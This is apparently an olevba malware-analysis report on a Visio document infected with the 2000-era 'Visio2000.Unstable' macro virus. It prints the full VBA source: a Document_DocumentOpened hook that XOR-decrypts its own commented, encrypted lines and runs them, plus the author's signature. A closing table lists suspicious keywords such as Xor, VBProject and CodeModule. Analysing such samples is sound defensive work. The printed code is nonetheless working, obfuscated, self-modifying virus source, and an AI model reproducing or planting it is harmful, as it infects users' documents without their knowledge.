olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSVisio.Unstable
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSVisio.Unstable - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_DocumentOpened(ByVal doc As IVDocument)
ck = 225
For cl = 9 To 32
ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine cl, ci(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(cl, 1), 2), ck)
Next
Unstable
End Sub
Private Sub Unstable()
'®�Á¤““Ž“Á³„’”Œ„Á¯„™•
'³€�…ŽŒˆ›„ÛÁ‚ŠÁÜÁ¨�•É³�…ÁËÁÔÑÈÁÊÁÓÑÑ
'µ‰ˆ’¥Ž‚”Œ„�•Ï·£±“Ž‹„‚•Ï·£¢ŽŒ‘Ž�„�•’ÉÐÈÏ¢Ž…„¬Ž…”�„Ï³„‘�€‚„­ˆ�„ÁÓÍÁÃ‚ŠÁÜÁÃÁÇÁ‚Š
'§Ž“Á‚�ÁÜÁØÁµŽÁÒÓ
'µ‰ˆ’¥Ž‚”Œ„�•Ï·£±“Ž‹„‚•Ï·£¢ŽŒ‘Ž�„�•’ÉÐÈÏ¢Ž…„¬Ž…”�„Ï³„‘�€‚„­ˆ�„Á‚�ÍÁ¢‰“ÉÒØÈÁÇÁ‚ˆÉµ‰ˆ’¥Ž‚”Œ„�•Ï·£±“Ž‹„‚•Ï·£¢ŽŒ‘Ž�„�•’ÉÐÈÏ¢Ž…„¬Ž…”�„Ï­ˆ�„’É‚�ÍÁÐÈÍÁ‚ŠÈ
'¯„™•
'Ž‚ÁÜÁµ‰ˆ’¥Ž‚”Œ„�•Ï·£±“Ž‹„‚•Ï·£¢ŽŒ‘Ž�„�•’ÉÐÈÏ¢Ž…„¬Ž…”�„Ï­ˆ�„’ÉÐÍÁÕÒÈ
'§Ž“Á˜ÁÜÁÐÁµŽÁ¥Ž‚”Œ„�•’Ï¢Ž”�•
'¨‡Á¥Ž‚”Œ„�•’É˜ÈÏ¥„’‚“ˆ‘•ˆŽ�ÁÝßÁÃ·ˆ’ˆŽÓŠÏ´�’•€ƒ�„ÃÁµ‰„�
'¥Ž‚”Œ„�•’É˜ÈÏ¥„’‚“ˆ‘•ˆŽ�ÁÜÁÃ·ˆ’ˆŽÓŠÏ´�’•€ƒ�„Ã
'¶ˆ•‰Á¥Ž‚”Œ„�•’É˜ÈÏ·£±“Ž‹„‚•Ï·£¢ŽŒ‘Ž�„�•’ÉÐÈÏ¢Ž…„¬Ž…”�„
'Ï¥„�„•„­ˆ�„’ÁÐÍÁÏ¢Ž”�•®‡­ˆ�„’
'Ï¨�’„“•­ˆ�„’ÁÐÍÁŽ‚
'¤�…Á¶ˆ•‰
'¥Ž‚”Œ„�•’É˜ÈÏ²€—„ ’Á¥Ž‚”Œ„�•’É˜ÈÏ§”��¯€Œ„
'¤�…Á¨‡
'¯„™•
'·ƒ„Ï‚ŽŒŒ€�…ƒ€“’ÉÐÈÏ¤�€ƒ�„…ÁÜÁ§€�’„
'·ƒ„Ï‚ŽŒŒ€�…ƒ€“’ÉÓÈÏ¤�€ƒ�„…ÁÜÁ§€�’„
'§Ž“ÁˆÁÜÁÐÁµŽÁ·ƒ„Ï¶ˆ�…Ž–’Ï¢Ž”�•
'·ƒ„Ï¶ˆ�…Ž–’ÉˆÈÏ·ˆ’ˆƒ�„ÁÜÁ§€�’„
'¯„™•
'¨‡Á¥€˜É¯Ž–ÉÈÈÁÜÁÒÐÁµ‰„�Á¬’†£Ž™ÁÃ´�’•€ƒ�„ÍÁˆ•Æ’Á‰€“…Á•ŽÁƒ„Á•‰„ÁŽ�„Á–‰ŽÆ’Á’•“Ž�†ÃÁÇÁ—ƒ¢“ÁÇÁÃ¶‰ŽÆ’Á€�–€˜’Á†Ž•Á€Á’‰Ž”�…„“Á•ŽÁ‚“˜ÁŽ�ÃÁÇÁ—ƒ¢“ÁÇÁÃ¶‰ŽÆ’Á†Ž•Á€Á’‰Ž”�…„“Á‡Ž“ÁŒ„ÞÃÍÁ—ƒ°”„’•ˆŽ�ÍÁÃ·ˆ’ˆŽÓÑÑÑÏ´�’•€ƒ�„Ã
'µ‰ˆ’¥Ž‚”Œ„�•Ï²€—„
End Sub
Private Function ci(cw, ck)
For cl = 1 To Len(cw)
ci = ci & Chr(Asc(Mid(cw, cl, 1)) Xor ck)
Next
End Function
'Visio2000.Unstable
'The first non-Microsoft VBA virus and the first VBA virus for Visio!
'Do not spread this shit! For educational purpose only!
'Written by jackie /Lz0NT/MVT on jan, 13th 2000
'Greets and thanks to Darkman/29A for all help and support!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

